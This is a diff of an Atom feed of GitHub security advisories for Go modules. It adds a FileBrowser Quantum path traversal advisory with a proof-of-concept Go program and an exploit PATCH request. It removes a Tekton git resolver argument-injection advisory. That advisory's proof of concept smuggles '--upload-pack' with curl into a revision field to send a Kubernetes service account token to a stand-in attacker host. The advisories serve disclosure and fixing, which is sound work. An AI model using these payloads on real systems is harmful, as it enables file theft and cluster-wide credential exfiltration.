@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://azu.github.io/github-advisory-database-rss/go.rss</id>
     <title>Security Advisory for Go modules</title>
-    <updated>2026-05-22T16:43:50.155Z</updated>
+    <updated>2026-05-22T17:31:25.864Z</updated>
     <generator>github-advisory-database-rss</generator>
     <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Ago"/>
     <subtitle>Security Advisory for Go modules on GitHub</subtitle>
@@ -12,6 +12,142 @@
     <category term="MODERATE"/>
     <category term="LOW"/>
     <entry>
+        <title type="html"><![CDATA[[github.com/gtsteffaniak/filebrowser/backend] FileBrowser Quantum: Path traversal in public share PATCH allows file ops outside shared directory]]></title>
+        <id>https://github.com/advisories/GHSA-qqqm-5547-774x</id>
+        <link href="https://github.com/advisories/GHSA-qqqm-5547-774x"/>
+        <updated>2026-05-22T17:26:25.000Z</updated>
+        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
+<p><code>publicPatchHandler</code> in <code>backend/http/public.go</code> joins user-controlled <code>fromPath</code> and <code>toPath</code> body fields with the trusted <code>d.share.Path</code> BEFORE the downstream sanitizer runs. Because <code>filepath.Join</code> collapses <code>..</code> segments during the join, the sanitizer in <code>resourcePatchHandler</code> never sees the traversal and the move/copy/rename operates on a path outside the shared directory. The same root-cause pattern was patched for the bulk DELETE endpoint as CVE-2026-44542 (GHSA-fwj3-42wh-8673), but the PATCH handler with the identical pattern was not updated.</p>
+<p>A public share link with <code>AllowModify=true</code> is sufficient to exploit this. Anyone holding such a link can move, copy, or rename arbitrary files within the share owner's source root.</p>
+<p>Verified on commit 869b640 (HEAD of <code>main</code> as of 2026-05-07).</p>
+<h2 id="details">Details</h2>
+<p>In <code>backend/http/public.go</code> the public PATCH handler accepts a JSON body with <code>items[].fromPath</code> and <code>items[].toPath</code> from the client, then prepends the share path before delegating to <code>resourcePatchHandler</code>:</p>
+<pre><code class="language-go">// backend/http/public.go (publicPatchHandler)
+for i := range req.Items {
+    req.Items[i].FromSource = sourceName
+    req.Items[i].FromPath   = utils.JoinPathAsUnix(d.share.Path, req.Items[i].FromPath) // line 372
+    req.Items[i].ToSource   = sourceName
+    req.Items[i].ToPath     = utils.JoinPathAsUnix(d.share.Path, req.Items[i].ToPath)   // line 374
+}
+d.Data = req
+status, err := resourcePatchHandler(w, r, d)
+</code></pre>
+<p><code>utils.JoinPathAsUnix</code> is a thin wrapper around <code>filepath.Join</code>, which
+calls <code>filepath.Clean</code> and resolves <code>..</code> segments. By the time the
+joined path reaches <code>resourcePatchHandler</code>, every <code>..</code> from the body
+has been collapsed:</p>
+<pre><code class="language-go">// backend/http/resource.go (resourcePatchHandler)
+cleanFromPath, err := utils.SanitizeUserPath(item.FromPath) // line 794
+// ...
+cleanToPath, err  := utils.SanitizeUserPath(item.ToPath)    // line 800
+</code></pre>
+<p><code>SanitizeUserPath</code> (in <code>backend/common/utils/file.go</code>) checks for <code>..</code> segments after <code>filepath.Clean</code>. Since the join already cleaned the path, no <code>..</code> segment remains, the sanitizer returns success, and the move/copy/rename proceeds on the escaped target.</p>
+<p>The share owner's user is substituted as the acting user for permission checks (<code>d.user = shareCreatedByUser</code>), so the access-control layer treats the request as if the share owner performed it. In a default configuration with no explicit access rules and <code>DenyByDefault=false</code>, <code>Access.Permitted</code> returns true for any path within the source, and the only remaining boundary is the source root itself (<code>idx.Path</code> in <code>Index.GetRealPath</code>).</p>
+<p>The fix that landed for CVE-2026-44542 / GHSA-fwj3-42wh-8673 moved the sanitizer before the join in <code>resourceBulkDeleteHandler</code> (<code>backend/http/resource.go:274</code>) and in <code>withHashFileHelper</code> (<code>backend/http/middleware.go:57</code>). The PATCH variant in <code>public.go</code> follows the opposite order (join first, sanitize later) and was not updated.</p>
+<p>For comparison, the same file's <code>publicPutHandler</code> uses the safe order:</p>
+<pre><code class="language-go">// backend/http/public.go (publicPutHandler) -- safe order
+cleanPath, err := utils.SanitizeUserPath(path)         // sanitize FIRST
+if err != nil { return http.StatusBadRequest, err }
+resolvedPath := utils.JoinPathAsUnix(d.share.Path, cleanPath) // then join
+</code></pre>
+<h2 id="poc">PoC</h2>
+<p>The bug reproduces deterministically with the project's own helpers, without needing the full server. The Go program below uses verbatim copies of <code>SanitizeUserPath</code> (from <code>backend/common/utils/file.go</code>) and <code>JoinPathAsUnix</code> (from <code>backend/common/utils/main.go</code>) and replays the exact sequence executed for one item in <code>publicPatchHandler</code> followed by <code>resourcePatchHandler</code>.</p>
+<pre><code class="language-go">package main
+
+import (
+    "fmt"
+    "path/filepath"
+    "runtime"
+    "strings"
+)
+
+// Verbatim from backend/common/utils/file.go
+func SanitizeUserPath(userPath string) (string, error) {
+    clean := filepath.Clean(userPath)
+    for _, segment := range strings.Split(clean, string(filepath.Separator)) {
+        if segment == ".." {
+            return "", fmt.Errorf("invalid path: path traversal detected")
+        }
+    }
+    if clean == "." {
+        return "", fmt.Errorf("invalid path: path must standard index path")
+    }
+    return clean, nil
+}
+
+// Verbatim from backend/common/utils/main.go
+func JoinPathAsUnix(parts ...string) string {
+    p := filepath.Join(parts...)
+    if runtime.GOOS == "windows" {
+        p = strings.ReplaceAll(p, "\\", "/")
+    }
+    return p
+}
+
+func main() {
+    sharePath := "/users/alice/shared/" // d.share.Path (server-controlled)
+    attackerInput := "../../bob/secret.txt"
+
+    // publicPatchHandler line 372: join BEFORE sanitize
+    joined := JoinPathAsUnix(sharePath, attackerInput)
+
+    // resourcePatchHandler line 794: sanitize the already-joined path
+    sanitized, err := SanitizeUserPath(joined)
+
+    fmt.Printf("attacker input: %q\n", attackerInput)
+    fmt.Printf("after join:     %q\n", joined)
+    fmt.Printf("sanitizer err:  %v\n", err)
+    fmt.Printf("sanitized path: %q\n", sanitized)
+}
+</code></pre>
+<p>Output:</p>
+<pre><code>attacker input: "../../bob/secret.txt"
+after join:     "/users/bob/secret.txt"
+sanitizer err:  &lt;nil&gt;
+sanitized path: "/users/bob/secret.txt"
+</code></pre>
+<p>The path <code>/users/bob/secret.txt</code> is outside the share root <code>/users/alice/shared/</code> and is the value passed to <code>Index.GetRealPath</code> which resolves to <code>&lt;source-root&gt;/users/bob/secret.txt</code>. The downstream move/copy/rename then targets that file. The same input is rejected by <code>SanitizeUserPath</code> if the order is reversed (sanitize-then-join), which is the order used by <code>publicPutHandler</code> and the post-fix bulk DELETE.</p>
+<p>End-to-end exploit request shape:</p>
+<pre><code>PATCH /public/api/resources?hash=&lt;share-hash&gt; HTTP/1.1
+Content-Type: application/json
+
+{
+  "action": "rename",
+  "items": [
+    {
+      "fromSource": "default",
+      "fromPath":   "../../bob/secret.txt",
+      "toSource":   "default",
+      "toPath":     "stolen.txt"
+    }
+  ]
+}
+</code></pre>
+<p>After the request, <code>stolen.txt</code> exists inside the shared directory and is downloadable through the same public share, exfiltrating the file that was outside the share's intended scope.</p>
+<h2 id="impact">Impact</h2>
+<p>An unauthenticated attacker who possesses a public share link with <code>AllowModify=true</code> can move, copy, or rename any file inside the share owner's source root, escaping the share's intended directory. Two practical exploitation patterns:</p>
+<ol>
+<li><p>Read arbitrary files in the source root: rename a file from outside the shared directory to a location inside it, then download it through the share. This breaks confidentiality of any file the share owner can read.</p>
+</li>
+<li><p>Tamper with arbitrary files in the source root: move an attacker-controlled file (uploaded into the share) over the top of a victim file. This breaks integrity of files the share owner can write to (configuration files, dotfiles, web roots if the source includes them).</p>
+</li>
+</ol>
+<p>Scope is bounded by the source root rather than the shared directory, which is the same boundary class as CVE-2026-44542 (GHSA-fwj3-42wh-8673, CVSS 9.1). The remediation pattern is the same: sanitize first, then join. The fix is a one-spot change in <code>publicPatchHandler</code> to call <code>SanitizeUserPath</code> on <code>req.Items[i].FromPath</code> and <code>req.Items[i].ToPath</code> before the two <code>JoinPathAsUnix(d.share.Path, ...)</code> calls.</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-qqqm-5547-774x">https://github.com/gtsteffaniak/filebrowser/security/advisories/GHSA-qqqm-5547-774x</a></li>
+<li><a href="https://github.com/advisories/GHSA-qqqm-5547-774x">https://github.com/advisories/GHSA-qqqm-5547-774x</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-qqqm-5547-774x</uri>
+        </author>
+        <category label="severity" term="CRITICAL"/>
+        <published>2026-05-22T17:26:25.000Z</published>
+    </entry>
+    <entry>
         <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipelines has VerificationPolicy regex pattern bypass via substring matching]]></title>
         <id>https://github.com/advisories/GHSA-rmx9-2pp3-xhcr</id>
         <link href="https://github.com/advisories/GHSA-rmx9-2pp3-xhcr"/>
@@ -1345,123 +1481,6 @@ resources via RBAC.</li>
         </author>
         <category label="severity" term="MODERATE"/>
         <published>2026-04-21T20:26:41.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipeline: Git Resolver Unsanitized Revision Parameter Enables git Argument Injection Leading to RCE]]></title>
-        <id>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</id>
-        <link href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq"/>
-        <updated>2026-05-21T22:41:28.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>The git resolver's <code>revision</code> parameter is passed directly as a positional argument to <code>git fetch</code> without any validation that it does not begin with a <code>-</code> character. Because git parses flags from mixed positional arguments, an attacker can inject arbitrary <code>git fetch</code> flags such as <code>--upload-pack=&lt;binary&gt;</code>. Combined with the <code>validateRepoURL</code> function explicitly permitting URLs that begin with <code>/</code> (local filesystem paths), a tenant who can submit <code>ResolutionRequest</code> objects can chain these two behaviors to execute an arbitrary binary on the resolver pod. The <code>tekton-pipelines-resolvers</code> ServiceAccount holds cluster-wide <code>get/list/watch</code> on all Secrets, so code execution on the resolver pod enables full cluster-wide secret exfiltration.</p>
-<h2 id="details">Details</h2>
-<h3 id="root-cause-1--unvalidated-revision-parameter-passed-to-git-fetch">Root Cause 1 — Unvalidated <code>revision</code> parameter passed to <code>git fetch</code></h3>
-<p><code>pkg/resolution/resolver/git/repository.go:85</code>:</p>
-<pre><code class="language-go">// pkg/resolution/resolver/git/repository.go lines 84-96
-// 'revision' is the raw user-supplied string from the ResolutionRequest param.
-// It is passed verbatim as a positional argument to git fetch:
-func (repo *repository) checkout(ctx context.Context, revision string) error {
-    _, err := repo.execGit(ctx, "fetch", "origin", revision, "--depth=1")
-    // When revision == "--upload-pack=/usr/bin/curl", git parses it as the
-    // --upload-pack flag, not as a refspec — executing the binary locally.
-    if err != nil {
-        return fmt.Errorf("fetch: %w", err)
-    }
-    _, err = repo.execGit(ctx, "checkout", "FETCH_HEAD")
-    return err
-}
-</code></pre>
-<p><code>execGit</code> invokes <code>exec.CommandContext("git", ...)</code> — no shell is used, so shell metacharacters cannot be injected. However, git itself parses flags from mixed positional arguments. When <code>revision = "--upload-pack=/path/to/binary"</code>, git receives this as the flag <code>--upload-pack=/path/to/binary</code>, not as a refspec. <code>PopulateDefaultParams</code> (<code>resolver.go:418–424</code>) applies only a leading-slash strip and a <code>containsDotDot</code> check on the <code>pathInRepo</code> parameter; the <code>revision</code> parameter receives no validation at all.</p>
-<h3 id="root-cause-2--validaterepourl-explicitly-permits-local-filesystem-paths">Root Cause 2 — <code>validateRepoURL</code> explicitly permits local filesystem paths</h3>
-<p><code>pkg/resolution/resolver/git/resolver.go:154-158</code>:</p>
-<pre><code class="language-go">// validateRepoURL validates if the given URL is a valid git, http, https URL or
-// starting with a / (a local repository).
-func validateRepoURL(url string) bool {
-    pattern := `^(/|[^@]+@[^:]+|(git|https?)://)`
-    re := regexp.MustCompile(pattern)
-    return re.MatchString(url)
-}
-</code></pre>
-<p>Any URL beginning with <code>/</code> passes validation and is used directly as the argument to <code>git clone</code>. This means a local filesystem path such as <code>/tmp/some-repo</code> is a valid resolver URL.</p>
-<h3 id="exploit-chain">Exploit Chain</h3>
-<p><code>--upload-pack=&lt;binary&gt;</code> causes git to execute the specified binary as the upload-pack server when communicating with the remote. For local-path remotes (<code>/path</code>), git invokes the binary on the resolver pod itself with the repository path as its sole argument. Because the argument is passed via <code>exec.Command</code> as a single <code>--upload-pack=&lt;binary&gt;</code> string (not split by a shell), only binaries at known paths can be invoked — but several useful binaries exist in the resolver pod image (e.g., <code>/bin/sh</code>, <code>/usr/bin/curl</code>, <code>/bin/cp</code>).</p>
-<p>Attack complexity is High because the exploit requires either:</p>
-<ul>
-<li>A valid git repository at a known, predicable path on the resolver pod (e.g., <code>/tmp/&lt;reponame&gt;-&lt;suffix&gt;</code> from a concurrent resolution), or</li>
-<li>A default-URL configuration pointing at a local path</li>
-</ul>
-<h2 id="poc">PoC</h2>
-<pre><code class="language-bash"># Step 1: Set up a local git repository to serve as the "origin"
-# (in a real attack, the attacker would time this against a concurrent clone
-# or use any pre-existing git repo path on the resolver pod)
-git init /tmp/localrepo &amp;&amp; cd /tmp/localrepo &amp;&amp; git commit --allow-empty -m "init"
-
-# Step 2: Craft a ResolutionRequest with injected --upload-pack flag
-kubectl create -f - &lt;&lt;'EOF'
-apiVersion: resolution.tekton.dev/v1beta1
-kind: ResolutionRequest
-metadata:
-  name: revision-injection-poc
-  namespace: default
-  labels:
-    resolution.tekton.dev/type: git
-spec:
-  params:
-    - name: url
-      value: /tmp/localrepo
-    - name: revision
-      value: "--upload-pack=/usr/bin/curl http://c2.attacker.internal/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token | base64 -w0)"
-    - name: pathInRepo
-      value: README.md
-EOF
-
-# The resolver pod executes:
-# git -C &lt;tmpdir&gt; fetch origin \
-#   "--upload-pack=/usr/bin/curl http://c2.attacker.internal/..." \
-#   --depth=1
-#
-# For single-argument binaries (/bin/sh, /usr/bin/env, etc.):
-# git -C &lt;tmpdir&gt; fetch origin "--upload-pack=/bin/sh" --depth=1
-# Executes /bin/sh with the local repository path as argv[1].
-# From /bin/sh, the attacker can use a pre-staged script (e.g., written
-# via a workspace volume) to achieve arbitrary command execution.
-</code></pre>
-<p><strong>Verified</strong>: <code>git fetch origin --upload-pack=/tmp/test-exec.sh --depth=1</code> executes <code>test-exec.sh</code> on the local machine even when <code>origin</code> is a local filesystem path. Exit code 0 was observed with the test binary executed successfully.</p>
-<h2 id="impact">Impact</h2>
-<ul>
-<li><strong>Code execution on the resolver pod</strong> when an attacker can stage or predict a valid git repository path in <code>/tmp</code> on the resolver pod.</li>
-<li><strong>Full cluster-wide Secret exfiltration</strong>: The <code>tekton-pipelines-resolvers</code> ServiceAccount is bound to a ClusterRole that grants <code>get/list/watch</code> on all Secrets in all namespaces (<code>config/resolvers/200-clusterrole.yaml</code>). Code execution on the resolver pod is therefore equivalent to reading every Secret in the cluster.</li>
-<li><strong>Privilege escalation</strong>: Secrets typically include kubeconfig files, cloud provider credentials, and API tokens — reading them enables lateral movement to cloud infrastructure.</li>
-<li>Both the deprecated resolver (<code>pkg/resolution/resolver/git/</code>) and the current resolver (<code>pkg/remoteresolution/resolver/git/</code>) share the same <code>validateRepoURL</code>, <code>PopulateDefaultParams</code>, and <code>checkout</code> implementation via the shared <code>git</code> package. Both are affected.</li>
-</ul>
-<h2 id="recommended-fix">Recommended Fix</h2>
-<p><strong>Fix 1 — Validate that <code>revision</code> does not begin with <code>-</code></strong> in <code>PopulateDefaultParams</code>:</p>
-<pre><code class="language-go">if strings.HasPrefix(paramsMap[RevisionParam], "-") {
-    return nil, fmt.Errorf("invalid revision %q: must not begin with '-'", paramsMap[RevisionParam])
-}
-</code></pre>
-<p><strong>Fix 2 — Restrict <code>validateRepoURL</code> to remote URLs only</strong> (remove local-path support in production builds, or add an explicit admin opt-in feature flag):</p>
-<pre><code class="language-go">func validateRepoURL(url string) bool {
-    pattern := `^([^@]+@[^:]+|(git|https?)://)`
-    re := regexp.MustCompile(pattern)
-    return re.MatchString(url)
-}
-</code></pre>
-<p>Applying Fix 1 alone is sufficient to prevent the argument injection. Fix 2 eliminates the enabling condition (local-path remotes for which <code>--upload-pack</code> runs locally) and reduces attack surface further.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/tektoncd/pipeline/security/advisories/GHSA-94jr-7pqp-xhcq</a></li>
-<li><a href="https://github.com/tektoncd/pipeline/releases/tag/v1.11.1">https://github.com/tektoncd/pipeline/releases/tag/v1.11.1</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-40938">https://nvd.nist.gov/vuln/detail/CVE-2026-40938</a></li>
-<li><a href="https://github.com/advisories/GHSA-94jr-7pqp-xhcq">https://github.com/advisories/GHSA-94jr-7pqp-xhcq</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-94jr-7pqp-xhcq</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-04-21T20:28:36.000Z</published>
     </entry>
     <entry>
         <title type="html"><![CDATA[[github.com/tektoncd/pipeline] Tekton Pipeline: Git Resolver Unsanitized Revision Parameter Enables git Argument Injection Leading to RCE]]></title>
